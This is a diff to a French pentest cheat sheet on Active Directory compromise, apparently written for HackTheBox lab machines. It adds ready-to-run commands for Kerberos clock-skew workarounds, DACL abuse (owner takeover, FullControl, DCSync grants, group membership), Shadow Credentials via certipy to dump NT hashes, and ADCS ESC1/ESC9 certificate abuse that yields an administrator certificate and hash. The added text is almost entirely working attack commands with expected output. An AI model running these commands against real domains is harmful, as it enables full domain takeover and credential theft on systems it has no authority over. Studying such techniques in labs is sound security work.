@@ -7,6 +7,7 @@ Ordre = déroulé d'une compromission AD. `<IP>` = IP cible, `<DOM>` = domaine (
 > - Après **chaque reboot/revert**, l'IP change → **mettre à jour `/etc/hosts`** (sinon `nxc`, `secretsdump`… échouent).
 > - Kerberos raisonne en **noms** : toujours `-dc-ip <IP>` + domaine dans `/etc/hosts` (sinon `KDC_ERR_WRONG_REALM`, `Name or service not known`).
 > - Cible Kerberos (`-k`) = **FQDN exact du SPN** (`dc.dom.htb`), résolvable — jamais l'IP.
+> - **`KRB_AP_ERR_SKEW`** = horloge décalée du DC. `sudo ntpdate <IP_DU_DC>` ; si l'horloge « ne tient pas » (systemd la resynchronise), utiliser **`faketime '+Xh' <commande>`** (X = offset vu dans `ntpdate`). Toujours viser la **bonne IP** après un reboot.
 > - Transfert de fichier : `upload`/`download` d'evil-winrm écrivent parfois **0 octet** → préférer **SMB (`copy`)** ou **certutil**, et **toujours `dir`** pour vérifier la taille.
 
 ---
@@ -118,7 +119,50 @@ bloodyAD -u <user> -p '<pass>' -d <DOM> --host <IP> set password <cible> 'NewPas
 net rpc user add pwn 'P@ssw0rd123!' -U "<DOM>/<user>%<pass>" -S <IP>
 net rpc group addmem "Exchange Windows Permissions" pwn -U "<DOM>/<user>%<pass>" -S <IP>
 impacket-dacledit -action write -rights DCSync -principal pwn -target-dn "DC=dom,DC=htb" "<DOM>/pwn:P@ssw0rd123!" -dc-ip <IP>
+
+# WriteOwner sur un groupe/compte (Certified) : devenir owner -> FullControl -> s'ajouter
+impacket-owneredit -action write -new-owner <user> -target <cible> -dc-ip <IP> '<DOM>/<user>:<pass>'
+impacket-dacledit  -action write -rights FullControl -principal <user> -target <cible> -dc-ip <IP> '<DOM>/<user>:<pass>'
+net rpc group addmem "<GroupeCible>" <user> -U "<DOM>/<user>%<pass>" -S <IP>
+# equivalent bloodyAD :
+bloodyAD --host <IP> -d <DOM> -u <user> -p '<pass>' set owner <cible> <user>
+bloodyAD --host <IP> -d <DOM> -u <user> -p '<pass>' add genericAll <cible> <user>
+bloodyAD --host <IP> -d <DOM> -u <user> -p '<pass>' add groupMember <GroupeCible> <user>
 ```
+
+> ⚠️ Les outils veulent le **sAMAccountName exact** (`judith.mader`, pas `judith`) → sinon « SID not found in LDAP ».
+
+### Shadow Credentials (GenericWrite/GenericAll sur un USER) — Certified
+
+Écrire une clé dans `msDS-KeyCredentialLink` → s'authentifier **par certificat** → **hash NT direct** (rien à casser). Idéal si le mdp est aléatoire.
+```bash
+certipy-ad shadow auto -u <user>@<DOM> -p '<pass>' -account <cible> -dc-ip <IP>
+#   -> [*] Got hash for '<cible>': aad3b...:<NThash>
+# avec un hash au lieu d'un mdp : -hashes :<NThash>
+```
+
+---
+
+## 6bis. ADCS (certificats) — Escape / Authority / Certified
+
+```bash
+# 1) repérer les templates vulnérables
+certipy-ad find -vulnerable -u <user> -p '<pass>' -dc-ip <IP> -stdout      # ou -hashes :<NThash>
+
+# ESC1 (le template laisse choisir le SAN) : demander un certif AU NOM de l'admin
+certipy-ad req -u <user> -p '<pass>' -ca <CA_NAME> -template <TPL> -upn administrator@<DOM> -dc-ip <IP>
+
+# ESC9 (template sans extension SID) : réécrire le UPN de la cible -> certif -> remettre le UPN
+certipy-ad account update -u <ctrl_user> -hashes :<NT> -user <cible> -upn Administrator -dc-ip <IP>
+certipy-ad req -u <cible> -hashes :<NT_cible> -ca <CA_NAME> -template <TPL> -dc-ip <IP>   # -> administrator.pfx
+certipy-ad account update -u <ctrl_user> -hashes :<NT> -user <cible> -upn <cible>@<DOM> -dc-ip <IP>   # remettre !
+
+# 2) authentifier le certif (PKINIT) -> hash NT de l'admin
+certipy-ad auth -pfx administrator.pfx -dc-ip <IP> -domain <DOM>
+#   -> Got hash for 'administrator@<DOM>': aad3b...:<NThash>
+```
+
+> Modes ESC fréquents : **ESC1** (SAN libre), **ESC8** (relais vers l'enrôlement web), **ESC9** (pas d'extension SID → UPN). `certipy find -vulnerable` te dit lequel.
 
 ---
 
